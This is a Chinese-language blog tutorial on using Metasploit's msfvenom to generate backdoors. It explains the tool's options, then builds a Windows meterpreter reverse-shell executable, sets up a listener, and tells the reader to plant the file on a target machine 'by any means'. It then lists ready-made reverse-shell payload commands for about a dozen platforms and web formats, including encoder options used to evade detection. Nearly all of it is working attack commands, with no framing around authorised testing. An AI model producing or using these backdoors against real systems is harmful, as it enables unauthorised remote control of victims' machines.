# 原创
：  【MSFconsole进阶】Msfvenom后门生成模块：使用方法、shell生成、各种格式生成

# 【MSFconsole进阶】Msfvenom后门生成模块：使用方法、shell生成、各种格式生成

**目录**

[一、简介：](#%E4%B8%80%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A)

[二、命令参数](#%E4%BA%8C%E3%80%81%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0)

[三、使用方法：](#%E4%B8%89%E3%80%81%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%EF%BC%9A)

[3.1、第一步：生成shell.exe](#3.1%E3%80%81%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E7%94%9F%E6%88%90shell.exe)

[3.2、第二步：设置监听](#3.2%E3%80%81%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E8%AE%BE%E7%BD%AE%E7%9B%91%E5%90%AC)

[3.3、第三步：将shell.exe植入到windows运行](#3.3%E3%80%81%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E5%B0%86shell.exe%E6%A4%8D%E5%85%A5%E5%88%B0windows%E8%BF%90%E8%A1%8C)

[3.4、第四步：get到了](#3.4%E3%80%81%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9Aget%E5%88%B0%E4%BA%86)

[四、生成shellcode](#%E5%9B%9B%E3%80%81%E7%94%9F%E6%88%90shellcode)

[4.1、普通生成](#4.1%E3%80%81%E6%99%AE%E9%80%9A%E7%94%9F%E6%88%90)

[4.2、编码生成](#4.2%E3%80%81%E7%BC%96%E7%A0%81%E7%94%9F%E6%88%90)

[五、生成格式](#%E4%BA%94%E3%80%81%E7%94%9F%E6%88%90%E6%A0%BC%E5%BC%8F)

[5.1、 Windows](#5.1%E3%80%81%20Windows)

[5.2、Linux](#5.2%E3%80%81Linux)

[5.3、Mac](#5.3%E3%80%81Mac)

[5.4、Android](#5.4%E3%80%81Android)

[5.5、Aspx](#5.5%E3%80%81Aspx)

[5.6、JSP](#5.6%E3%80%81JSP)

[5.7、PHP](#5.7%E3%80%81PHP)

[5.8、BASH](#5.8%E3%80%81BASH)

[5.9、Python](#5.9%E3%80%81Python)

[5.10、War](#5.10%E3%80%81War)

[5.11、Perl](#5.11%E3%80%81Perl)

[5.12、Asp](#5.12%E3%80%81Asp)

---


## 一、简介：

> 
 msfvenom是msfpayload,msfencode的结合体
可利用msfvenom生成木马程序，并在目标机上执行，在本地监听上线


---


---


## 二、命令参数

> 

<pre><code>选项：
    -l, --list            &lt;type&gt;        # 列出所有可用的项目，其中值可以被设置为 					payloads, encoders, nops, platforms, archs, encrypt, formats等等
    -p, --payload         &lt;payload&gt;     # 指定特定的 Payload，如果被设置为 - ，那么从			标准输入流中读取
        --list-options                  # 列出--payload &lt;value&gt; 的标准，高级和规避选			项
    -f, --format          &lt;format&gt;      # 指定 Payload 的输出格式(使用 --list 			formats 列出)
    -e, --encoder         &lt;encoder&gt;     # 指定使用的 Encoder (使用 --list encoders 			列出)
        --sec-name        &lt;value&gt;       # 生成大型Windows二进制文件时使用的新名称。默认			值：随机4个字符的字符串
        --smallest                      # 使用所有可用的编码器生成最小的payload
        --encrypt         &lt;value&gt;       # 应用于shellcode的加密或编码类型 (使用--list 			encrypt 列出)
        --encrypt-key     &lt;value&gt;       # 用于加密的密钥
        --encrypt-iv      &lt;value&gt;       # 加密的初始化向量
    -a, --arch            &lt;arch&gt;        # 指定目标系统架构(使用 --list archs  列出)
        --platform        &lt;platform&gt;    # 指定目标系统平台 (使用 --list platforms 列			出)
    -o, --out             &lt;path&gt;        # 保存payload文件
    -b, --bad-chars       &lt;list&gt;        # 设置需要在 Payload 中避免出现的字符，如： 			'\x00\xff'
    -n, --nopsled         &lt;length&gt;      # 指定 nop 在 payload 中的数量
    -s, --space           &lt;length&gt;      # 设置未经编码的 Payload 的最大长度
        --encoder-space   &lt;length&gt;      # 编码后的 Payload 的最大长度
    -i, --iterations      &lt;count&gt;       # 设置 Payload 的编码次数
    -c, --add-code        &lt;path&gt;        # 指定包含一个额外的win32 shellcode文件
    -x, --template        &lt;path&gt;        # 指定一个特定的可执行文件作为模板
    -k, --keep                          # 保护模板程序的功能，注入的payload作为一个新的			进程运行
    -v, --var-name        &lt;value&gt;       # 指定一个变量名（当添加 -f 参数的时候，例如 -f 			python，那么输出为 python 代码， payload 会被按行格式化为 python 代码，追加到			一个 python变量中，这个参数即为指定 python 变量的变量名）
    -t, --timeout         &lt;second&gt;      # 设置从STDIN读取payload的等待时间（默认为			30,0为禁用）
    -h, --help                          # 帮助
</code></pre>




---


---


## 三、使用方法：

> 
（以Windows为例）
<h3>3.1、第一步：生成shell.exe</h3>
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.190.131 LPORT=9999 -f exe -o /root/shell.exe

 （还可以加上 -e 加上编码器……）




> 
<h3>3.2、第二步：设置监听</h3>
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.190.131
set LPORT 9999
run

 处于等待状态了


> 
<h3>3.3、第三步：将shell.exe植入到windows运行</h3>
各显神通……
然后等待监听状态
就会监听到运行shell.exe的电脑


> 
<h3>3.4、第四步：get到了</h3>
执行各种……


---


---


## 四、生成shellcode

> 
<h3>4.1、普通生成</h3>
msfvenom -p 有效载荷 -f 输出格式 -o 输出文件
msfvenom -p windows/meterpreter/reverse_tcp -f exe -o /root/payload.exe


> 
<h3>4.2、编码生成</h3>
msfvenom -a 系统架构 --platform 系统平台 -p 有效载荷 lhost=攻击机IP lport=攻击机端口 -e 编码方式 -i编码次数 -f 输出格式 -o 输出文件
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=192.168.190.131 lport=8888 -i 3 -e x86/shikata_ga_nai -f exe -o /root/payload.exe

 <img alt="" height="444" src="https://img-blog.csdnimg.cn/569c941654f74c498de3bfdbf20dc376.png" width="634"/>



---


---


## 五、生成格式

> 
<h3>5.1、 Windows</h3>
msfvenom -a x86 --platform windows  -p windows/meterpreter/reverse_tcp -i 3  LHOST=192.168.190.131 lport=4444 -e x86/shikata_ga_nai -f exe -o /root/payload.exe
<hr/>

<h3>5.2、Linux</h3>
msfvenom --platform linux -a x86 -p linux/x86/meterpreter/reverse_tcp  lhost=192.168.190.131 lport=4444 -f elf -o /root/payload.elf
<hr/>
<h3>**5.3、Mac**</h3>
msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp lhost=192.168.190.131 port=4444 -f macho -o payload.macho
<hr/>
<h3>5.4、Android</h3>
msfvenom -p android/meterpreter/reverse_tcp -o /root/payload.apk
<hr/>
<h3>5.5、Aspx</h3>
msfvenom --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.190.131 lport=4444 -f aspx -o /root/payload.aspx
<hr/>
<h3>5.6、JSP</h3>
msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=192.168.190.131 lport=4444 -f raw -o /root/payload.jsp
<hr/>
<h3>5.7、PHP</h3>
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.190.131 lport=4444 -f raw -o /root/payload.php
<hr/>
<h3>5.8、BASH</h3>
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.190.131 lport=4444 -f raw -o /root/shell.sh
<hr/>
<h3>5.9、Python</h3>
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.190.131 port=4444 -f raw -o /root/shell.py
<hr/>
<h3>5.10、War</h3>
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.190.131 lport=4444 -f war
<hr/>
<h3>5.11、Perl</h3>
msfvenom -p cmd/unix/reverse_perl lhost=192.168.190.131 lport=4444 -f perl
<hr/>
<h3>5.12、Asp</h3>
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.190.131 port=4444 -f asp


### 5.2、Linux

---


### 5.4、Android

---


### 5.6、JSP

---


### 5.8、BASH

---


### 5.10、War

---


### 5.12、Asp
